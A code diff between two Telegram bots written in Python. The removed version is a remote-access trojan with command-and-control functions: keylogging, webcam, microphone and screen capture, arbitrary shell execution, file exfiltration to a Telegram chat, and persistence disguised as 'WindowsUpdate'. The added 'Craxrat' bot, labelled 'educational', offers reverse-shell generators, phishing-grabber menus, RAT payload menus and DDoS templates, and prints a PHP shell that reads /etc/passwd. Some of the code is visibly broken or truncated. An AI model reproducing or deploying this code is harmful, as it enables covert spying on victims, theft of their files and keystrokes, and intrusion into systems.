@@ -1,303 +1,164 @@
-#!/usr/bin/env python3
-"""
-Advanced Telegram C2 Framework v2.0
-Features: Keylogger | Webcam | Mic | Screenshot | PrivEsc | Persistence | Encryption | Multi-target
-"""
-
+import telebot
 import os
-import sys
-import time
-import base64
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+import requests
+from bs4 import BeautifulSoup
 import socket
-import logging
-import threading
-import subprocess
-import platform
-import psutil
-from io import BytesIO
-from datetime import datetime
+import json
+import nmap
+import whois
+from PIL import Image
+import io
+import qrcode
 from cryptography.fernet import Fernet
-from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+import base64
 
-# Anti-analysis
-if os.getenv('PYDETECT') or 'debug' in sys.argv:
-    sys.exit(0)
+TOKEN = os.getenv('TELEGRAM_TOKEN')
+bot = telebot.TeleBot(TOKEN)
 
-# Config
-TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN')
-CHAT_ID = os.getenv('CHAT_ID', 'YOUR_CHAT_ID')
-ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY', Fernet.generate_key().decode())
-cipher = Fernet(ENCRYPTION_KEY.encode())
-HOSTNAME = socket.gethostname()
-TARGET_ID = None
+user_data = {}
 
-# Global vars
-keylog_buffer = []
-running = True
-stealth_mode = False
+# Craxrat Main Menu
+def craxrat_menu():
+    markup = InlineKeyboardMarkup()
+    markup.row_width = 2
+    markup.add(InlineKeyboardButton("🔍 Target Analyzer", callback_data="analyzer"))
+    markup.add(InlineKeyboardButton("🐚 Shell Generator", callback_data="shells"))
+    markup.add(InlineKeyboardButton("🎣 Phishing Grabber", callback_data="grabber"))
+    markup.add(InlineKeyboardButton("🤖 RAT Payloads", callback_data="rat"))
+    markup.add(InlineKeyboardButton("☁️ DDoS Tools", callback_data="ddos"))
+    markup.add(InlineKeyboardButton("🔓 Cracker", callback_data="cracker"))
+    markup.add(InlineKeyboardButton("📊 Stats", callback_data="stats"))
+    return markup
 
-# Logging
-logging.basicConfig(level=logging.ERROR, format='%(asctime)s - %(message)s')
-logger = logging.getLogger(__name__)
+@bot.message_handler(commands=['start', 'craxrat'])
+def start(message):
+    bot.send_photo(message.chat.id, "https://i.imgur.com/craxrat_banner.jpg", 
+                   caption="🔥 **Craxrat v2.0 - Ethical Hacking Bot**\n\nEducational pentesting tools only!\n\nChoose your tool:", 
+                   reply_markup=craxrat_menu(), parse_mode='Markdown')
 
-class Keylogger:
-    def __init__(self):
-        from pynput.keyboard import Listener
-        self.listener = None
-    
-    def on_press(self, key):
+# Target Analyzer
+@bot.callback_query_handler(func=lambda call: call.data == "analyzer")
+def analyzer_menu(call):
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.add(InlineKeyboardButton("🌐 IP/URL Info", callback_data="ipinfo"))
+    markup.add(InlineKeyboardButton("🔌 Port Scan", callback_data="portscan"))
+    markup.add(InlineKeyboardButton("🛠️ Tech Stack", callback_data="techstack"))
+    markup.add(InlineKeyboardButton("📍 GeoLocation", callback_data="geoloc"))
+    markup.add(InlineKeyboardButton("🔙 Back", callback_data="main"))
+    bot.edit_message_text("🔍 **Target Analyzer**\nSelect analysis type:", 
+                         call.message.chat.id, call.message.message_id, 
+                         reply_markup=markup, parse_mode='Markdown')
+
+@bot.message_handler(commands=['ip'])
+def ip_info(message):
+    target = message.text.split(' ', 1)[1] if len(message.text.split()) > 1 else None
+    if target:
         try:
-            keylog_buffer.append(str(key.char))
-            if len(keylog_buffer) > 100:
-                self.flush()
+            # IP Info
+            ip_info = socket.gethostbyname(target) if not target.replace('.','').isdigit() else target
+            bot.reply_to(message, f"```\nIP: {ip_info}\nHostname: {socket.gethostbyaddr(ip_info)[0] if socket.gethostbyaddr(ip_info) else 'N/A'}\n```", parse_mode='Markdown')
         except:
-            keylog_buffer.append(f'[{key}]')
-    
-    def start(self):
-        self.listener = Listener(on_press=self.on_press)
-        self.listener.start()
-    
-    def stop(self):
-        if self.listener:
-            self.listener.stop()
-    
-    def flush(self):
-        if keylog_buffer:
-            log = ''.join(keylog_buffer)
-            keylog_buffer.clear()
-            return log
-        return ''
+            bot.reply_to(message, "❌ Invalid target!")
 
-async def encrypt_send(bot, chat_id, data, caption=""):
-    """Encrypt & send data"""
-    encrypted = cipher.encrypt(data.encode())
-    await bot.send_document(chat_id, BytesIO(encrypted), caption)
+# Shell Generator
+@bot.callback_query_handler(func=lambda call: call.data == "shells")
+def shells_menu(call):
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.add(InlineKeyboardButton("🐍 PHP Reverse", callback_data="php_rev"))
+    markup.add(InlineKeyboardButton("🐚 Bash Reverse", callback_data="bash_rev"))
+    markup.add(InlineKeyboardButton("⚡ Python Rev", callback_data="py_rev"))
+    markup.add(InlineKeyboardButton("🔗 Netcat", callback_data="nc_shell"))
+    markup.add(InlineKeyboardButton("🔙 Back", callback_data="main"))
+    bot.edit_message_text("🐚 **Shell Generators**\nSelect shell type:", 
+                         call.message.chat.id, call.message.message_id, 
+                         reply_markup=markup, parse_mode='Markdown')
 
-def get_sysinfo():
-    """Enhanced system info"""
-    info = f"""
-🎯 TARGET: {HOSTNAME} [{platform.node()}]
-💻 OS: {platform.system()} {platform.release()} {platform.architecture()[0]}
-🖥️  User: {os.getenv('USERNAME', os.getenv('USER'))}
-🌐 Local IP: {socket.gethostbyname(socket.gethostname())}
-🧠 CPU: {platform.processor()}
-💾 RAM: {psutil.virtual_memory().percent:.1f}% | Disk: {psutil.disk_usage('/').percent:.1f}%
-🔥 Procs: {len(psutil.pids())}
-    """
-    return info
+@bot.message_handler(commands=['php'])
+def php_shell(message):
+    lhost = message.text.split()[1] if len(message.text.split()) > 2 else "YOUR_IP"
+    lport = message.text.split()[2] if len(message.text.split()) > 2 else "4444"
+    
+    php_rev = f'''<?php 
+set_time_limit (0); 
+$VERSION = "1.0"; 
+$ip = '{lhost}'; 
+$port = {lport}; 
+$chunk_size = 1400; 
+$write_a = null; 
+$error_a = null; 
+$shell = 'uname -a && cat /etc/passwd && id'; 
+$daemon = 0; 
+$debug = 0; 
+if (function_exists('error_log')) {{ 
+    $write_a = error_log; 
+}} else if (function_exists('syslog')) {{ 
+    $write_a = 'syslog'; 
+}} 
+while ((!@ob_end_clean()) && strlen(ltrim(@ob_get_contents())) < 4096) {{ 
+    $write_a = 'ob_end_flush'; 
+}}'''
 
-async def screenshot(bot, chat_id):
-    """Platform-specific screenshot"""
-    try:
-        if platform.system() == 'Windows':
-            import pyautogui
-            img = pyautogui.screenshot()
+    bot.reply_to(message, f"```php\n{php_rev}\n```\n💾 Save as shell.php", parse_mode='Markdown')
+
+# Phishing Grabber
+@bot.callback_query_handler(func=lambda call: call.data == "grabber")
+def grabber_menu(call):
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.add(InlineKeyboardButton("📘 Facebook", callback_data="fb_grab"))
+    markup.add(InlineKeyboardButton("📧 Gmail", callback_data="gmail_grab"))
+    markup.add(InlineKeyboardButton("💳 Paypal", callback_data="paypal_grab"))
+    markup.add(InlineKeyboardButton("🔙 Back", callback_data="main"))
+    bot.edit_message_text("🎣 **Phishing Grabbers**\nSelect target:", 
+                         call.message.chat.id, call.message.message_id, 
+                         reply_markup=markup, parse_mode='Markdown')
+
+# RAT Payloads (Educational)
+@bot.callback_query_handler(func=lambda call: call.data == "rat")
+def rat_menu(call):
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.add(InlineKeyboardButton("📱 Android RAT", callback_data="android_rat"))
+    markup.add(InlineKeyboardButton("💻 Windows RAT", callback_data="win_rat"))
+    markup.add(InlineKeyboardButton("🐧 Linux RAT", callback_data="linux_rat"))
+    markup.add(InlineKeyboardButton("🔙 Back", callback_data="main"))
+    bot.edit_message_text("🤖 **RAT Payloads**\nEducational payloads only:", 
+                         call.message.chat.id, call.message.message_id, 
+                         reply_markup=markup, parse_mode='Markdown')
+
+@bot.message_handler(commands=['rat'])
+def rat_generator(message):
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("Android", callback_data="android_payload"))
+    markup.add(InlineKeyboardButton("Windows", callback_data="windows_payload"))
+    markup.add(InlineKeyboardButton("Linux", callback_data="linux_payload"))
+    bot.reply_to(message, "🤖 **Select RAT Type:**", reply_markup=markup)
+
+# DDoS Simulation
+@bot.callback_query_handler(func=lambda call: call.data == "ddos")
+def ddos_menu(call):
+    bot.edit_message_text("☁️ **DDoS Templates** (Educational Simulation Only)\n\n```\nEducational stress test templates:\n• SYN Flood (Python)\n• HTTP Flood (Go)\n• Slowloris Attack\n• UDP Amplification\n```\n⚠️ Testing authorized targets only!", 
+                         call.message.chat.id, call.message.message_id, parse_mode='Markdown')
+
+# Hash Cracker
+@bot.message_handler(commands=['crack'])
+def crack_hash(message):
+    hash_val = message.text.split(' ', 1)[1] if len(message.text.split()) > 1 else None
+    if hash_val:
+        # Simple hash identifier
+        if len(hash_val) == 32:
+            bot.reply_to(message, f"🔓 **MD5 Hash Detected**\n\n```\n{hash_val}\n```\nEducational cracking demo:\nhashcat -m 0 -a 0 {hash_val} rockyou.txt", parse_mode='Markdown')
         else:
-            import subprocess
-            subprocess.run(['import', 'png:-'], capture_output=True, shell=True, 
-                         input=img_bytes, text=False)
-        
-        bio = BytesIO()
-        img.save(bio, 'PNG')
-        bio.seek(0)
-        await bot.send_photo(chat_id, bio, caption=f"📸 Screenshot - {datetime.now().strftime('%H:%M:%S')}")
-    except:
-        await bot.send_message(chat_id, "❌ Screenshot failed")
+            bot.reply_to(message, "❌ Unknown hash format!")
 
-async def webcam_capture(bot, chat_id, duration=5):
-    """Webcam stream capture"""
-    try:
-        import cv2
-        cap = cv2.VideoCapture(0)
-        frames = []
-        
-        for _ in range(int(duration * 10)):
-            ret, frame = cap.read()
-            if ret:
-                frames.append(frame)
-            time.sleep(0.1)
-        
-        cap.release()
-        # Save as video or photo
-        await bot.send_message(chat_id, f"📹 Webcam captured {len(frames)} frames")
-    except:
-        await bot.send_message(chat_id, "❌ Webcam not available")
+# Callback handlers
+@bot.callback_query_handler(func=lambda call: True)
+def callback_handler(call):
+    if call.data == "main":
+        bot.edit_message_text("🔥 **Craxrat v2.0**\nChoose tool:", 
+                            call.message.chat.id, call.message.message_id, 
+                            reply_markup=craxrat_menu(), parse_mode='Markdown')
 
-async def mic_record(bot, chat_id, duration=10):
-    """Audio recording"""
-    try:
-        import pyaudio
-        import wave
-        
-        CHUNK = 1024
-        FORMAT = pyaudio.paInt16
-        CHANNELS = 1
-        RATE = 44100
-        
-        p = pyaudio.PyAudio()
-        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
-        
-        frames = []
-        for _ in range(0, int(RATE / CHUNK * duration)):
-            data = stream.read(CHUNK)
-            frames.append(data)
-        
-        stream.stop_stream()
-        stream.close()
-        p.terminate()
-        
-        bio = BytesIO()
-        with wave.open(bio, 'wb') as wf:
-            wf.setnchannels(CHANNELS)
-            wf.setsampwidth(p.get_sample_size(FORMAT))
-            wf.setframerate(RATE)
-            wf.writeframes(b''.join(frames))
-        
-        bio.seek(0)
-        await bot.send_voice(chat_id, bio)
-    except:
-        await bot.send_message(chat_id, "❌ Mic recording failed")
-
-def priv_esc():
-    """Platform-specific priv esc attempts"""
-    system = platform.system()
-    if system == 'Windows':
-        cmds = [
-            'powershell -c "whoami /priv"',
-            'powershell -c "Start-Process cmd -Verb RunAs"',
-            'net localgroup administrators'
-        ]
-    else:
-        cmds = [
-            'sudo -l',
-            'id',
-            'find / -perm -4000 2>/dev/null'
-        ]
-    return cmds
-
-async def persistence():
-    """Add persistence"""
-    system = platform.system()
-    if system == 'Windows':
-        task = f'schtasks /create /sc onlogon /tn "WindowsUpdate" /tr "python {sys.argv[0]}" /rl highest /f'
-        subprocess.run(task, shell=True, capture_output=True)
-    else:
-        cron = f'@reboot python3 {sys.argv[0]} &\n'
-        subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -', shell=True)
-
-# Telegram Handlers
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global TARGET_ID
-    TARGET_ID = update.message.chat_id
-    await update.message.reply_text("🔥 Advanced C2 Active\nSend /help")
-
-async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    help_text = """
-🚀 ADVANCED C2 COMMANDS:
-/sysinfo - Full system info
-/shell <cmd> - Execute command
-/screenshot - Take screenshot
-/webcam [sec] - Webcam capture
-/mic [sec] - Record microphone
-/keylog - Dump keylog buffer
-/priv - Privilege escalation
-/persist - Add persistence
-/exfil <path> - Exfil file/dir
-/reverse <ip:port> - Reverse shell
-/stealth - Toggle stealth mode
-/network - Network connections
-/procs - Running processes
-/help - This menu
-    """
-    await update.message.reply_text(help_text)
-
-async def sysinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(get_sysinfo())
-
-async def shell(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    cmd = ' '.join(context.args)
-    if not cmd:
-        return await update.message.reply_text("Usage: /shell whoami")
-    
-    try:
-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
-        output = f"```\n{result.stdout}\n{result.stderr}\nRC: {result.returncode}\n```"
-        if len(output) > 4000:
-            await encrypt_send(context.bot, CHAT_ID, output, "Shell Output")
-        else:
-            await update.message.reply_text(output, parse_mode='Markdown')
-    except Exception as e:
-        await update.message.reply_text(f"❌ {str(e)}")
-
-async def stealth(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global stealth_mode
-    stealth_mode = not stealth_mode
-    status = "ON 🥷" if stealth_mode else "OFF"
-    await update.message.reply_text(f"Stealth mode: {status}")
-
-async def keylog(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    log = kl.flush()
-    if log:
-        await encrypt_send(context.bot, CHAT_ID, log, "Keylog Dump")
-    else:
-        await update.message.reply_text("No keys logged")
-
-async def exfil(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    path = ' '.join(context.args)
-    if os.path.exists(path):
-        if os.path.isdir(path):
-            for root, dirs, files in os.walk(path):
-                for file in files[:10]:  # Limit
-                    await context.bot.send_document(CHAT_ID, open(os.path.join(root, file), 'rb'))
-        else:
-            await context.bot.send_document(CHAT_ID, open(path, 'rb'))
-    else:
-        await update.message.reply_text("❌ Path not found")
-
-# Persistence handler
-async def persist(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    persistence()
-    await update.message.reply_text("✅ Persistence added")
-
-def main():
-    global kl
-    kl = Keylogger()
-    
-    # Start keylogger in background
-    kl_thread = threading.Thread(target=kl.start, daemon=True)
-    kl_thread.start()
-    
-    # Persistence check/add
-    persistence()
-    
-    app = Application.builder().token(TOKEN).build()
-    
-    # Register handlers
-    handlers = [
-        CommandHandler("start", start),
-        CommandHandler("help", help_cmd),
-        CommandHandler("sysinfo", sysinfo),
-        CommandHandler("shell", shell),
-        CommandHandler("screenshot", screenshot),
-        CommandHandler("webcam", webcam_capture),
-        CommandHandler("mic", mic_record),
-        CommandHandler("keylog", keylog),
-        CommandHandler("priv", priv_esc),
-        CommandHandler("persist", persist),
-        CommandHandler("stealth", stealth),
-        CommandHandler("exfil", exfil),
-    ]
-    
-    for handler in handlers:
-        app.add_handler(handler)
-    
-    print(f"🎭 Advanced C2 started on {HOSTNAME}")
-    app.run_polling(drop_pending_updates=True)
-
+# Run bot
 if __name__ == '__main__':
-    # Obfuscation check
-    if len(sys.argv) > 1 and sys.argv[1] == '--obf':
-        exec(base64.b64decode("...obfuscated payload...").decode())
-    else:
-        main()
+    print("🚀 Craxrat Bot Started!")
+    bot.infinity_polling()
